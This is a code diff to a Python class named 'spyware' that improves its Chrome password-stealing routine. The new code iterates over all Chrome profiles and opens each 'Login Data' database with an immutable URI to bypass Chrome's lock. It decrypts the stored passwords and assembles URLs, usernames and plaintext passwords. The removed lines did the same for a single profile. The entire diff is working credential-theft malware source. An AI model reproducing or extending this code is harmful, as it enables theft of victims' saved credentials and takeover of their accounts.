@@ -78,47 +78,66 @@ class spyware:
 
     def get_passwords(self):
         final_ans = "\nChrome Passwords:\n"
-        key = self.fetch_encryption_key()
-        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                            "Google", "Chrome", "User Data", "Default", "Login Data")
-
-        filename = os.path.join(os.getenv("temp"), "ChromePasswords.db")
         try:
-            shutil.copyfile(db_path, filename)
+            key = self.fetch_encryption_key()
         except Exception:
-            # Chrome is running and has the file locked — copy via cmd bypass
-            subprocess.run(f'copy /Y "{db_path}" "{filename}"', shell=True,
-                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        db = sqlite3.connect(filename)
-        cursor = db.cursor()
-                
-        cursor.execute(
-            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
-            "order by date_last_used")
-        
-        for row in cursor.fetchall():
-            main_url = row[0]
-            login_url = row[1]
-            username = row[2]
-            password = self.decrypt_passwords(row[3], key)
-            
-            if username or password:                                    
-                final_ans += f"Main URL: {main_url}\n"
-                final_ans += f"Login URL: {login_url}\n"
-                final_ans += f"Username: {username}\n"
-                final_ans += f"Password: {password}\n\n"
-            else:
+            return final_ans + "Failed to get encryption key\n"
+
+        user_data = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                                 "Google", "Chrome", "User Data")
+        profiles = ["Default"]
+        try:
+            for item in os.listdir(user_data):
+                if item.startswith("Profile "):
+                    profiles.append(item)
+        except Exception:
+            pass
+
+        for profile in profiles:
+            db_path = os.path.join(user_data, profile, "Login Data")
+            if not os.path.exists(db_path):
                 continue
 
-            final_ans += "=" * 80 + "\n\n"
+            db = None
+            tmp = None
+            try:
+                # immutable=1 bypasses Chrome's file lock without copying
+                db = sqlite3.connect(f'file:{db_path}?immutable=1', uri=True)
+            except Exception:
+                try:
+                    tmp = os.path.join(os.getenv("temp"), f"CP_{profile}.db")
+                    shutil.copyfile(db_path, tmp)
+                    db = sqlite3.connect(tmp)
+                except Exception:
+                    continue
 
-        cursor.close()
-        db.close()
-        
-        try:            
-            os.remove(filename)
-        except:
-            pass
+            try:
+                cursor = db.cursor()
+                cursor.execute(
+                    "select origin_url, action_url, username_value, password_value "
+                    "from logins order by date_last_used")
+                for row in cursor.fetchall():
+                    username = row[2]
+                    password = self.decrypt_passwords(row[3], key)
+                    if not username and (not password or password == "No Passwords"):
+                        continue
+                    final_ans += f"Profile : {profile}\n"
+                    final_ans += f"Main URL: {row[0]}\n"
+                    final_ans += f"Login URL: {row[1]}\n"
+                    final_ans += f"Username: {username}\n"
+                    final_ans += f"Password: {password}\n"
+                    final_ans += "=" * 80 + "\n\n"
+                cursor.close()
+            except Exception:
+                pass
+            finally:
+                if db:
+                    db.close()
+                if tmp:
+                    try:
+                        os.remove(tmp)
+                    except Exception:
+                        pass
 
         return final_ans
 
